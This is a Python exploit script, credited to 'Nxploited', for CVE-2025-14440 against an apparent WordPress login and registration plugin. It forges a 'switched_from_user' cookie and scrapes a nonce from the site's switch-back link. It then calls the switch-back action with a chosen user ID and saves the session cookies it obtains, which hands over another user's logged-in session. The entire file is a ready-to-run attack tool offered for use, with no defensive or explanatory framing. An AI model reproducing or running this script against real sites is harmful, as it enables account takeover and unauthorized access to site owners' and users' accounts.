# -*- coding: utf-8 -*-
# By: Nxploited
# GitHub: https://github.com/Nxploited
# Telegram: https://t.me/Nxploited



import sys
import requests
import re
import os
import argparse
import logging
from urllib.parse import urlparse, urlunparse

SCRIPT_AUTHOR = "Nxploited"
GITHUB = "https://github.com/Nxploited"
TELEGRAM = "https://t.me/Nxploited"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Nxploited Exploit Script)",
    "Accept": "*/*",
    "Connection": "close",
    "Cookie": "jay_login_register_switched_from_user=1"
}
NONCE_REGEX = r'_wpnonce=([a-fA-F0-9]{10,})'
COOKIE_FILENAME = "extracted_cookies.txt"
TIMEOUT = 8
LOG_FORMAT = "[%(levelname)s] %(message)s"

logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def sanitize_url(url):
    url = url.encode('utf-8', 'ignore').decode('utf-8', 'ignore')
    if not url.lower().startswith(("http://", "https://")):
        url = "http://" + url
    parts = list(urlparse(url))
    parts[2] = os.path.normpath(parts[2])
    return urlunparse(parts)

def extract_nonce(target_url):
    try:
        resp = requests.get(
            target_url.rstrip('/') + '/',
            headers=HEADERS,
            verify=False,
            timeout=TIMEOUT
        )
        if resp.status_code != 200:
            logging.error(f"Initial request returned status code {resp.status_code}")
            return None
        match = re.search(r'href="[^"]*jay_login_register_switch_back[^"]*"', resp.text)
        if not match:
            logging.error("Could not find the switch_back link in response.")
            return None
        nonce_match = re.search(NONCE_REGEX, match.group(0))
        if nonce_match:
            return nonce_match.group(1)
        logging.error("Nonce not found in the href attribute.")
    except Exception as e:
        logging.error(f"Exception extracting nonce: {e}")
    return None

def exploit(target_url, nonce, user_id):
    exploit_params = {
        "action": "jay_login_register_switch_back",
        "_wpnonce": nonce
    }
    if user_id:
        exploit_params["id"] = user_id

    try:
        with requests.Session() as session:
            session.headers.update(HEADERS)
            resp = session.get(
                target_url.rstrip('/') + '/',
                params=exploit_params,
                verify=False,
                timeout=TIMEOUT
            )
            cookies = session.cookies.get_dict()
            has_cookies = bool(cookies)
            if has_cookies:
                cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
                logging.info(f"[SUCCESS] Exploitation successful. Cookies:\n  {cookie_str}")
                store_cookie(target_url, cookie_str)
            else:
                logging.warning("No cookies returned. Exploitation may have failed.")
            return has_cookies
    except Exception as e:
        logging.error(f"Exception during exploit: {e}")
        return False

def store_cookie(target_url, cookie_str):
    try:
        parsed = urlparse(target_url)
        site = f"{parsed.scheme}://{parsed.netloc}"
        with open(COOKIE_FILENAME, "a", encoding="utf-8") as f:
            f.write(f'{site}: {cookie_str}\n')
        logging.info(f"[INFO] Cookies saved to: {COOKIE_FILENAME}")
    except Exception as e:
        logging.error(f"Failed to store cookies: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-14440 | Exploit By Nxploited (Khaled Alenazi)"
    )
    parser.add_argument('-u', '--url', required=True, help="Target URL (with or without http/https)")
    parser.add_argument('-id', '--id', required=False, help="User ID to use for exploitation")
    args = parser.parse_args()

    print("=======================================================")
    print(f"# CVE-2025-14440 | Exploit By {SCRIPT_AUTHOR} (Khaled Alenazi)")
    print(f"# GitHub: {GITHUB}")
    print(f"# Telegram: {TELEGRAM}")
    print("=======================================================")

    target_url = sanitize_url(args.url)
    user_id = args.id

    logging.info("Sanitized target URL: %s", target_url)
    logging.info("Attempting to extract Nonce...")

    nonce = extract_nonce(target_url)
    if nonce:
        logging.info(f"Extracted nonce: {nonce}")
    else:
        logging.error("Failed to extract nonce! Exiting.")
        sys.exit(1)

    logging.info("Attempting exploitation...")
    if exploit(target_url, nonce, user_id):
        logging.info("Exploit process completed. Check extracted_cookies.txt.")
    else:
        logging.warning("Exploit did not yield cookies. Target may not be vulnerable or input may be incorrect.")

if __name__ == "__main__":
    main()
